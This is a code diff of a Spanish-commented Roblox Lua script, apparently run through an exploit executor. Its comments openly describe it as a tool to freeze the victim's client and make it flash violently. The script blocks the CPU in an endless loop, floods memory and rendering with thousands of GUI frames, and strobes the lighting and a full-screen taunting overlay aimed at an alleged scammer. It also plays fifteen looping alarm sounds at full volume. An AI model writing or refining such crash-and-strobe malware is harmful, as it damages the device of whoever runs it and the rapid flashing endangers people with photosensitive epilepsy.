@@ -1,86 +1,100 @@
--- PITUFO WX7: OMNIPOTENT RGB OVERLOAD (FINAL VERSION)
--- ADVERTENCIA: CRASH INMINENTE / SATURACIÓN TOTAL
+-- PITUFO WX7: MODO APOCALIPSIS (CONGELAMIENTO & RENDER OVERLOAD)
+-- ADVERTENCIA: Al ejecutar esto, Roblox se quedará "No responde" y parpadeará violentamente.
 
 repeat task.wait() until game:IsLoaded()
 
 local RunService = game:GetService("RunService")
 local Lighting = game:GetService("Lighting")
+local HttpService = game:GetService("HttpService")
 local parent = (gethui and gethui()) or game:GetService("CoreGui")
 
--- 1. SOBRECARGA DE HILOS (CPU KILLER)
--- Esto genera millones de cálculos por frame para "congelar" el procesador
-RunService.Stepped:Connect(function()
-    for i = 1, 1000000 do 
-        local _ = math.sin(i) * math.acos(math.random())
+-- 1. SOBRECARGA DE HILOS (CPU KILLER - SIN ESPERAS)
+-- Este bucle bloquea el procesador al 100% al instante.
+task.spawn(function()
+    while true do
+        for i = 1, 1000000 do 
+            local _ = math.sin(i) * math.acos(math.random()) -- Cálculos basura masivos
+        end
+        -- NO HAY TASK.WAIT(). EL HILO ESTÁ MUERTO AQUÍ.
     end
 end)
 
--- 2. GENERADOR MASIVO DE OBJETOS (RAM & GPU CRASHER)
--- Crea miles de interfaces cada segundo para saturar la memoria
+-- 2. GENERADOR MASIVO DE OBJETOS RGB (RAM & GPU CRASHER)
+-- Crea miles de interfaces cada segundo para saturar la memoria y el renderizado
 task.spawn(function()
     local gui = Instance.new("ScreenGui", parent)
-    gui.Name = "PITUFO_FINAL_STRIKE"
+    gui.Name = "PITUFO_SYSTEM_OVERRIDE"
+    gui.IgnoreGuiInset = true
     gui.DisplayOrder = 1000000
     
     while true do
-        for i = 1, 500 do
+        for i = 1, 1000 do -- Mil objetos por ciclo
             local f = Instance.new("Frame", gui)
             f.Size = UDim2.new(math.random(), 0, math.random(), 0)
             f.Position = UDim2.new(math.random(), 0, math.random(), 0)
-            f.BackgroundColor3 = Color3.fromHSV(tick() % 1, 1, 1) -- RGB NIVEL DIOS
+            -- RGB NIVEL DIOS ESTALLANDO
+            f.BackgroundColor3 = Color3.fromHSV(tick() * 10 % 1, 1, 1) 
             f.BorderSizePixel = 0
             
             local t = Instance.new("TextLabel", f)
             t.Size = UDim2.new(1, 0, 1, 0)
-            t.Text = "ESTAFA DETECTADA"
+            t.Text = "¿ME QUERIAS ESTAFAR PITUFO?"
             t.TextScaled = true
             t.BackgroundTransparency = 1
             t.TextColor3 = Color3.new(1,1,1)
+            t.Font = Enum.Font.Code -- Fuente Hacker
             
-            -- Eliminar rápido para que el procesador trabaje el doble creando y borrando
-            task.delay(0.05, function() f:Destroy() end)
+            -- Ciclo de creación y destrucción ultra rápido para saturar CPU
+            task.delay(0.01, function() f:Destroy() end)
         end
-        task.wait() -- Velocidad máxima
+        task.wait() -- Velocidad máxima de spam
     end
 end)
 
--- 3. DISTORSIÓN DE ILUMINACIÓN EXTREMA
+-- 3. DISTORSIÓN DE ILUMINACIÓN EXTREMA (GLITCH VISUAL)
 task.spawn(function()
     while true do
-        Lighting.Brightness = 9999
+        Lighting.Brightness = math.random(0, 9999)
         Lighting.ClockTime = math.random(0, 24)
-        Lighting.ExposureCompensation = math.random(-10, 10)
-        Lighting.Ambient = Color3.fromHSV(tick() % 1, 1, 1)
-        task.wait()
+        Lighting.ExposureCompensation = math.random(-20, 20)
+        -- Parpadeo ambiental RGB
+        Lighting.Ambient = Color3.fromHSV(tick() * 5 % 1, 1, 1)
+        task.wait() -- Máxima velocidad
     end
 end)
 
--- 4. CACOFONÍA DE AUDIO (10 SONIDOS SIMULTÁNEOS)
-for i = 1, 10 do
+-- 4. MENSAJE FINAL HACKER OVERLAY
+local overlay = Instance.new("ScreenGui", parent)
+overlay.IgnoreGuiInset = true
+overlay.DisplayOrder = 9999999
+
+local label = Instance.new("TextLabel", overlay)
+label.Size = UDim2.new(1, 0, 1, 0)
+label.BackgroundColor3 = Color3.new(0, 0, 0)
+label.BackgroundTransparency = 0.1
+label.Text = "SYSTEM FAILURE\n¿ME QUERIAS ESTAFAR PITUFO?\n\nOWNED BY WX7"
+label.TextColor3 = Color3.new(1, 0, 0)
+label.TextScaled = true
+label.Font = Enum.Font.Code -- Fuente Hacker
+label.ZIndex = 9999999
+
+-- Parpadeo de Texto y Rotación Violenta
+RunService.RenderStepped:Connect(function()
+    -- RGB Estallando en el texto principal
+    label.TextColor3 = Color3.fromHSV(tick() * 20 % 1, 1, 1)
+    -- Rotación caótica para marear
+    label.Rotation = math.sin(tick() * 50) * 10
+end)
+
+-- 5. CACOFONÍA DE AUDIO (MÁXIMA SATURACIÓN)
+-- Reproduce múltiples alarmas simultáneamente para saturar el audio
+for i = 1, 15 do
     local s = Instance.new("Sound", workspace)
-    s.SoundId = "rbxassetid://4612375231"
+    s.SoundId = "rbxassetid://4612375231" -- Alarma de error industrial
     s.Volume = 10
-    s.PlaybackSpeed = 0.2 + (i * 0.2)
+    s.PlaybackSpeed = 0.1 + (i * 0.1) -- Varios tonos molestos
     s.Looped = true
     s:Play()
 end
 
--- 5. MENSAJE FINAL (HACKER OVERLAY)
-local overlay = Instance.new("ScreenGui", parent)
-local label = Instance.new("TextLabel", overlay)
-label.Size = UDim2.new(1, 0, 1, 0)
-label.BackgroundColor3 = Color3.new(0, 0, 0)
-label.BackgroundTransparency = 0.2
-label.Text = "SYSTEM FAILURE\nBY PITUFO WX7\n\nNOS QUERIAS ESTAFAR?"
-label.TextColor3 = Color3.new(1, 0, 0)
-label.TextScaled = true
-label.Font = Enum.Font.Code
-label.ZIndex = 9999999
-
--- Parpadeo de Texto
-RunService.RenderStepped:Connect(function()
-    label.TextColor3 = Color3.fromHSV(tick() % 1, 1, 1)
-    label.Rotation = math.sin(tick() * 10) * 5
-end)
-
-print("PITUFO WX7: EJECUCIÓN DIVINA INICIADA. ADIÓS AL SISTEMA.")
+print("PITUFO WX7: TOTAL OVERRIDE LOADED. ADIÓS AL SISTEMA.")
